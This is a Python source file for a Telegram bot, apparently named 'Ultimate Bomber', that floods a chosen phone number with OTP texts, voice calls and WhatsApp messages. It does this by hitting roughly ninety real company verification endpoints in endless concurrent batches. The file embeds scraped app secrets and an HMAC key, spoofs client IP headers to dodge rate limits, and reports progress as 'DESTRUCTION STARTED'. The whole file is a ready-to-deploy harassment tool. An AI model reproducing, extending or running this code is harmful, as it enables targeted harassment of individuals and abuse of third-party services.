import os
import sys
import time
import asyncio
import logging
import random
import uuid
import hmac
import hashlib
import base64
from typing import Optional

import aiohttp
from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters,
)
from starlette.applications import Starlette
from starlette.responses import PlainTextResponse, Response
from starlette.routing import Route
import uvicorn

# ================== CONFIG ==================
BOT_TOKEN       = os.environ.get("BOT_TOKEN", "") 
WEBHOOK_URL     = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
PORT            = int(os.environ.get("PORT", 8000))

# BALANCED SPEED (Taaki Spam Block na lage aur SMS lagataar aayein)
CONCURRENCY     = 50
DELAY           = 0.5
REQUEST_TIMEOUT = 5
# ============================================

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger("tsunami")

user_sessions: dict = {}
_http_session: Optional[aiohttp.ClientSession] = None
telegram_app: Optional[Application] = None

def is_valid_target(num: str) -> bool:
    return num.isdigit() and len(num) == 10 and num[0] in "6789"

# =========================================================================
#  ULTIMATE APIS (Diljot + Tsunami + Bombitup Ind + Bombitup Pak)
# =========================================================================
def build_endpoints():
    UA_D = "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
    E = []

    # ==========================================
    # 1. BOMBITUP CALL / IVR APIS
    # ==========================================
    E.append({"name":"Swiggy_Call","method":"POST","url":"https://profile.swiggy.com/api/v3/app/request_call_verification","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.swiggy.com"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"TataCapital_Voice","method":"POST","url":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","isOtpViaCallAtLogin":"true"}'})
    E.append({"name":"1MG_Call","method":"POST","url":"https://www.1mg.com/auth_api/v6/create_token","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"number":"{t}","otp_on_call":true}'})
    E.append({"name":"MagicPin_Call","method":"POST","url":"https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/","headers":{"Content-Type":"application/json","auth-secret-key":"kQLMCQBrfevxhzuPpFWT","Origin":"https://magicpin.in","User-Agent":UA_D},"data":'{"phoneNumber":"91{t}","authMethod":"call","token":""}'})

    # ==========================================
    # 2. BOMBITUP IND API APIS
    # ==========================================
    E.append({"name":"AjioLogin","method":"POST","url":"https://login.web.ajio.com/api/auth/generateLoginOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}"}'})
    E.append({"name":"AjioSignup","method":"POST","url":"https://login.web.ajio.com/api/auth/signupSendOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"firstName":"","login":"","genderType":"","mobileNumber":"{t}","r92niPhiXyTfhKKzMV5xjM8W1cAd8GN13p":"","requestType":"SENDOTP","newDesign":false}'})
    E.append({"name":"BigBasketDaily","method":"POST","url":"https://bbdaily.bigbasket.com/bbd/ms/members/v2/sendotp","headers":{"Content-Type":"application/json","User-Agent":"BBD/Android/7.5.0/14"},"data":'{"identifier":"{t}","referrer":"unified_login"}'})
    E.append({"name":"Aakash","method":"POST","url":"https://antheapi.aakash.ac.in/api/generate-lead-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile_psid":"{t}","mobile_number":"","activity_type":"aakash-myadmission-signup","webengageData":{"profile":"student","whatsapp_opt_in":false,"method":"mobile"}}'})
    E.append({"name":"ConfirmTkt","method":"GET","url":"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={t}&newOtp=true&retry=false&hashOtp=true&fireBaseSMSvendor=karix&locale=en&channel=Android&appVersion=463&session={uuid}","headers":{"User-Agent":"okhttp/5.0.0-alpha.3"},"data":None})
    E.append({"name":"Housing","method":"POST","url":"https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_buy_home","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"query":"mutation($phone: String) { sendOtp(phone: $phone) { success } }","variables":{"phone":"{t}"}}'})
    E.append({"name":"JarApp","method":"POST","url":"https://prod.myjar.app/v3/api/auth/requestOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D,"app-signature":"28f0a03fa7c891e812954517ca3d242e5e352018a707a42a9f2d06a9e1e0e674"},"data":'{"hasExperianConsent":true,"phoneNumber":"{t}","countryCode":"91"}'})
    E.append({"name":"MaxFashion","method":"POST","url":"https://www.maxfashion.in/landmarkshopscommercews/in/oauth/token","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"appId=ANDROID&client_id=mobile_android&client_secret=F7LBBekbehGRQWpROIKJq&grant_type=client_credentials"})
    E.append({"name":"My11Circle","method":"POST","url":"https://www.my11circle.com/api/fl/auth/v3/getOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"email":"","mobile":"{t}","whatsappAlerts":false}'})
    E.append({"name":"NykaaFashion","method":"POST","url":"https://www.nykaafashion.com/grahak-service/api/v1/auth/login/init?loginMethod=MOBILE_OTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileOrEmail":"{t}"}'})
    E.append({"name":"TVSMotor","method":"POST","url":"https://tvsconnectapi.tvsmotor.com/api/v3/UserLogin/Loginv3","headers":{"Content-Type":"application/json","User-Agent":"okhttp/5.0.0-alpha.2"},"data":'{"IsSuppressOTP":false,"MobileNumber":"{t}","otpLength":6}'})
    E.append({"name":"ZeptoSignup","method":"POST","url":"https://api.zepto.co.in/api/v1/user/customer/signup/","headers":{"Content-Type":"application/json","User-Agent":"okhttp/4.12.0"},"data":'{"signupType":"otp_sms","data":{"mobile_number":"{t}"}}'})
    E.append({"name":"ZestMoney","method":"POST","url":"https://app.zestmoney.in/zestlife/v2/Customer/GenerateOtp","headers":{"Content-Type":"application/json","User-Agent":"okhttp/4.9.1"},"data":'{"email":"","mobileNumber":"91{t}"}'})
    E.append({"name":"CountryDelight","method":"POST","url":"https://api.countrydelight.in/api/v1/customer/requestOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"x-source":"Android"},"data":'{"mobile_number":"{t}","new_user":true,"device":"Android","mode":"SMS"}', "hmac": True})
    E.append({"name":"Eatsure","method":"POST","url":"https://thanos.faasos.io/v3/customer/generate_otp.json?app_version=10388&client_os=eatsure_android","headers":{"Content-Type":"application/json","User-Agent":UA_D,"x-key-id":"!M<R[(B062"},"data":'{"phone_number":"{t}","country_code":"IND","dialing_code":"+91","is_new_customer":false,"communication_channel":"sms"}', "special_sig": True})

    # ==========================================
    # 3. BOMBITUP PAK API APIS
    # ==========================================
    E.append({"name":"Cricwick","method":"GET","url":"https://staging.cricwick.net:13002/api/login_or_sendpin?telco=telenor&sub_type=&phone={t}","headers":{"User-Agent":UA_D},"data":None})
    E.append({"name":"Dawaai","method":"POST","url":"https://dawaai.pk/login-signup/send_verification_code","headers":{"Content-Type":"application/x-www-form-urlencoded","digital-signature":"332761950"},"data":"phone_number=%2B92{t}&no_validation=true"})
    E.append({"name":"Ding","method":"POST","url":"https://www.ding.com/PhoneLogin/OwnedPhoneNumber","headers":{"Content-Type":"application/json; charset=UTF-8"},"data":'{"phoneNumber":"{t}","countryDial":92}'})
    E.append({"name":"GrocerApp","method":"POST","url":"https://endpoints.grocerapps.com/v1/otp/generate","headers":{"Content-Type":"application/json"},"data":'{"phone_number":"{t}","type":"sms"}'})
    E.append({"name":"Udhaar","method":"POST","url":"https://web.udhaar.pk/udhaar/dukaan/create/sendotp/","headers":{"Content-Type":"application/json"},"data":'{"phone_number":"0{t}","referer":null,"version":"multi-business"}'})
    E.append({"name":"ZTVLive","method":"POST","url":"http://188.138.61.16/edu/index.php/subscriber/subscribe","headers":{"Content-Type":"application/json"},"data":'{"msisdn":{t},"level":"5","userName":"kamles"}'})
    E.append({"name":"JazzTV","method":"GET","url":"http://119.160.95.242/jazztvLIVE/index.php/services/index/signin/{t}/","headers":{"User-Agent":UA_D},"data":None})

    # ==========================================
    # 4. DILJOT WHATSAPP APIS
    # ==========================================
    E.append({"name":"KPN_WA","method":"POST","url":"https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB","headers":{"Content-Type":"application/json"},"data":'{"phone_number":{"number":"{t}","country_code":"+91"}}'})
    E.append({"name":"MamaEarth_WA","method":"POST","url":"https://auth.mamaearth.in/v1/auth/initiate-signup","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"HeroFinCorp_WA","method":"POST","url":"https://loans.apps.herofincorp.com/api/generateOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","terms":true,"whatsapp":true}'})
    E.append({"name":"Refyne_WA","method":"POST","url":"https://prod-api.refyne.co.in/auth/v3/send-otp","headers":{"Content-Type":"application/json"},"data":'{"channel":"WHATSAPP","recipient":"{t}"}'})

    # ==========================================
    # 5. DILJOT / TSUNAMI SMS APIS
    # ==========================================
    E.append({"name":"Lenskart","method":"POST","url":"https://api-gateway.juno.lenskart.com/v3/customers/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phoneCode":"+91","telephone":"{t}"}'})
    E.append({"name":"PharmEasy","method":"POST","url":"https://pharmeasy.in/api/v2/auth/send-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Wakefit","method":"POST","url":"https://api.wakefit.co/api/consumer-sms-otp/","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"ShipRocket","method":"POST","url":"https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send","headers":{"Content-Type":"application/json"},"data":'{"mobileNumber":"{t}"}'})
    E.append({"name":"Khatabook","method":"POST","url":"https://api.khatabook.com/v1/auth/request-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","app_signature":"wk+avHrHZf2"}'})
    E.append({"name":"RummyCircle","method":"POST","url":"https://www.rummycircle.com/api/fl/auth/v3/getOtp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","isPlaycircle":false}'})
    E.append({"name":"Apna","method":"POST","url":"https://production.apna.co/api/userprofile/v1/otp/","headers":{"Content-Type":"application/json"},"data":'{"hash_type":"original","phone_number":"91{t}","request_id":"{timestamp}","retries":0}'})
    E.append({"name":"BajajFinserv","method":"POST","url":"https://apigateway.bajajfinserv.in/apigateway/otp/sso","headers":{"Content-Type":"application/json"},"data":'{"mobileNumber":"{t}","source":"WEB"}'})
    E.append({"name":"Udaan","method":"POST","url":"https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":"mobile={t}"})
    E.append({"name":"OLX","method":"POST","url":"https://www.olx.in/api/auth/authenticate?lang=en-IN","headers":{"Content-Type":"application/json"},"data":'{"method":"sms","phone":"{t}","language":"en-IN","grantType":"retry"}'})
    E.append({"name":"JioSaavn","method":"POST","url":"https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0","headers":{"Content-Type":"application/json"},"data":'{"phone_number":"+91{t}"}'})
    E.append({"name":"Licious","method":"POST","url":"https://www.licious.com/auth/api/v1/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","countryCode":"+91"}'})
    E.append({"name":"Groww","method":"POST","url":"https://groww.in/api/v2/auth/otp/send","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","platform":"WEB"}'})
    E.append({"name":"RedBus","method":"POST","url":"https://www.redbus.in/api/v2/auth/otp/send","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","source":"web"}'})
    E.append({"name":"Dominos","method":"POST","url":"https://pizzaonline.dominos.co.in/api/v2/customer/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"McDelivery","method":"POST","url":"https://mcdelivery.mcdonaldsindia.com/api/customer/sendOTP","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"KFC","method":"POST","url":"https://online.kfc.co.in/api/customer/otp/generate","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"BigBasket","method":"POST","url":"https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/","headers":{"Content-Type":"application/json"},"data":'{"mobile_number":"{t}"}'})
    E.append({"name":"Blinkit","method":"POST","url":"https://api.grofers.com/v5/otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Zepto","method":"POST","url":"https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/","headers":{"Content-Type":"application/json"},"data":'{"mobileNumber":"{t}"}'})
    E.append({"name":"JioMart","method":"POST","url":"https://www.jiomart.com/api/v1/user/send-otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Snapdeal","method":"POST","url":"https://www.snapdeal.com/authenticate/otp/send","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Ajio","method":"POST","url":"https://www.ajio.com/api/otp/generate","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Myntra","method":"POST","url":"https://www.myntra.com/gw/mobile-auth/otp/generate","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Meesho","method":"POST","url":"https://www.meesho.com/api/v1/otp/send","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"EaseMyTrip","method":"POST","url":"https://www.easemytrip.com/api/otp/SendOtp","headers":{"Content-Type":"application/json"},"data":'{"Mobileno":"{t}","Type":"M"}'})
    E.append({"name":"KreditBee","method":"POST","url":"https://api.kreditbee.in/api/v2/auth/otp/send","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Netmeds","method":"POST","url":"https://www.netmeds.com/api/v2/auth/login/send-otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Unacademy","method":"POST","url":"https://unacademy.com/api/v2/user/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Purplle","method":"POST","url":"https://www.purplle.com/api/v2/auth/send-otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Cultfit","method":"POST","url":"https://www.cult.fit/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Housing_SMS","method":"POST","url":"https://login.housing.com/api/v2/send-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","country_url_name":"in"}'})
    E.append({"name":"PropTiger","method":"POST","url":"https://www.proptiger.com/api/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Practo","method":"POST","url":"https://www.practo.com/api/v2/auth/send-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"HealthKart","method":"POST","url":"https://www.healthkart.com/api/customer/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Cars24","method":"POST","url":"https://www.cars24.com/api/v2/auth/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"CarDekho","method":"POST","url":"https://www.cardekho.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"MagicBricks","method":"POST","url":"https://www.magicbricks.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"99acres","method":"POST","url":"https://www.99acres.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"NoBroker_2","method":"POST","url":"https://www.nobroker.in/api/v4/account/otp/send","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":"phone={t}&countryCode=IN"})
    E.append({"name":"MamaEarth_SMS","method":"POST","url":"https://auth.mamaearth.in/v1/auth/sms-otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"PlumGoodness","method":"POST","url":"https://www.plumgoodness.com/api/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Biotique","method":"POST","url":"https://www.biotique.com/api/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"HealthifyMe","method":"POST","url":"https://api.healthifyme.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Netflix_IN","method":"POST","url":"https://www.netflix.com/api/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"UMANG","method":"POST","url":"https://web.umang.gov.in/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Airtel","method":"POST","url":"https://www.airtel.in/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Jio","method":"POST","url":"https://www.jio.com/api/jio-login-service/login/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"mobileNumber":"{t}","loginFlowType":"MOBILE","alternateNumber":""}'})
    E.append({"name":"Vi","method":"POST","url":"https://www.myvi.in/api/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Porter","method":"POST","url":"https://api.porter.in/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Delhivery","method":"POST","url":"https://www.delhivery.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"BookMyShow","method":"POST","url":"https://in.bookmyshow.com/auth/send/otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"PVR","method":"POST","url":"https://www.pvrcinemas.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})

    return E

ENDPOINTS = build_endpoints()

# ================== HTTP SESSION ==================
async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=200, limit_per_host=50, ssl=False)
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        _http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    return _http_session

async def fire_endpoint(ep: dict, target: str) -> bool:
    url = ep["url"].replace("{t}", target)
    ts = str(int(time.time() * 1000))
    u_id = uuid.uuid4().hex
    url = url.replace("{timestamp}", ts).replace("{uuid}", u_id)
    
    spoof = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    headers = {k: v.replace("{t}", target).replace("{timestamp}", ts).replace("{uuid}", u_id) for k, v in ep["headers"].items()}
    headers["X-Forwarded-For"] = spoof
    headers["Client-IP"] = spoof
    headers["X-Request-Id"] = uuid.uuid4().hex

    data = ep["data"]
    if isinstance(data, str):
        data = data.replace("{t}", target).replace("{timestamp}", ts).replace("{uuid}", u_id)

    if ep.get("hmac"):
        secret = bytes.fromhex("4174697368204167726177616c20436f756e7472792044656c69676874")
        msg = f"{ts}|{target}|SMS".encode('utf-8')
        sig = base64.b64encode(hmac.new(secret, msg, hashlib.sha256).digest()).decode('utf-8')
        headers["X-Timestamp"] = ts
        headers["X-Signature"] = sig

    if ep.get("special_sig"):
        random_bytes = os.urandom(32)
        sig = base64.b64encode(random_bytes).decode('utf-8')
        headers["x-timestamp"] = ts
        headers["x-signature"] = sig

    try:
        session = await get_http_session()
        async with session.request(method=ep["method"], url=url, headers=headers, data=data if data else None, ssl=False) as resp:
            await resp.read()
            return resp.status in (200, 201, 202)
    except Exception:
        return False

async def _fire_batch(batch, target):
    tasks = [fire_endpoint(ep, target) for ep in batch]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return sum(1 for r in results if r is True)

# ================== BUTTON HANDLERS ==================
async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("?? START ULTIMATE BOMBER ??", callback_data="start_bomb")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = "?? **ULTIMATE BOMBER** ??\n\nAll APIs loaded. Click below to begin."
    await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")

async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    if query.data == "start_bomb":
        user_sessions[uid] = {"state": "awaiting_target", "running": False}
        await query.message.edit_text("?? Send target number (10 digits, no +91):")
    
    elif query.data == "stop_bomb":
        s = user_sessions.get(uid)
        if s and s.get("running"):
            s["running"] = False
            s["cancelled"] = True
            await query.message.edit_text("?? **STOPPING...**", parse_mode="Markdown")

# ================== TEXT HANDLER ==================
async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text.strip()
    s = user_sessions.get(uid)
    
    if not s or s.get("state") != "awaiting_target":
        return
        
    if not is_valid_target(text):
        await update.message.reply_text("? Invalid. 10 digits starting with 6/7/8/9.")
        return

    s.update(target=text, state="running", running=True, cancelled=False, sent=0, round=0, started_at=time.time())
    
    keyboard = [[InlineKeyboardButton("?? STOP BOMBING", callback_data="stop_bomb")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"?? **ULTIMATE BOMBER ACTIVATED** ??\n\n"
        f"?? Target: `{text}`\n"
        f"? Speed: MAXIMUM\n"
        f"?? Total APIs: {len(ENDPOINTS)}\n"
        f"?? **DESTRUCTION STARTED!**",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )
    
    asyncio.create_task(run_bombing(uid, s))

# ================== BOMBING LOGIC ==================
async def run_bombing(uid: int, s: dict):
    target = s["target"]
    sent = 0
    start = time.time()
    idx = 0
    
    try:
        while s.get("running"):
            s["round"] += 1
            batch = []
            for _ in range(CONCURRENCY):
                batch.append(ENDPOINTS[idx % len(ENDPOINTS)])
                idx += 1

            ok = await _fire_batch(batch, target)
            sent += ok
            s["sent"] = sent
            
            if DELAY > 0:
                await asyncio.sleep(DELAY)
                
    except Exception as e:
        logger.exception(f"Bombing error: {e}")
    finally:
        s["running"] = False

    try:
        bot = Bot(token=BOT_TOKEN)
        elapsed = int(time.time() - start)
        reason = "?? Stopped by you" if s.get("cancelled") else "? Done"
        await bot.send_message(uid, f"{reason}!\n\n?? Target: `{target}`\n?? Total: *{sent}*\n? Time: {elapsed}s", parse_mode="Markdown")
    except Exception:
        pass

# ================== WEBHOOK & STARLETTE ==================
async def health(request): return PlainTextResponse("OK", status_code=200)
async def root(request): return PlainTextResponse("Ultimate Bomber Live ??")

async def startup():
    global telegram_app
    if not WEBHOOK_URL: return
    webhook_path = f"/webhook/{BOT_TOKEN}"
    full_url = f"{WEBHOOK_URL}{webhook_path}"
    
    telegram_app = Application.builder().token(BOT_TOKEN).updater(None).build()
    telegram_app.add_handler(CommandHandler("start", start_cmd))
    telegram_app.add_handler(CallbackQueryHandler(button_handler))
    telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    
    await telegram_app.initialize()
    await telegram_app.bot.set_webhook(url=full_url, allowed_updates=Update.ALL_TYPES)
    await telegram_app.start()
    logger.info(f"? Webhook set")

async def webhook(request):
    if telegram_app is None: return Response("not ready", status_code=503)
    try:
        data = await request.json()
        update = Update.de_json(data, telegram_app.bot)
        await telegram_app.process_update(update)
    except Exception as e: logger.exception(f"webhook error: {e}")
    return Response("ok")

async def shutdown():
    global _http_session, telegram_app
    if _http_session and not _http_session.closed: await _http_session.close()
    if telegram_app: await telegram_app.stop(); await telegram_app.shutdown()

def create_app() -> Starlette:
    routes = [Route("/", root), Route("/health", health), Route(f"/webhook/{BOT_TOKEN}", webhook, methods=["POST"])]
    return Starlette(routes=routes, on_startup=[startup], on_shutdown=[shutdown])

app = create_app()

if __name__ == "__main__":
    if not BOT_TOKEN: sys.exit(1)
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="info")
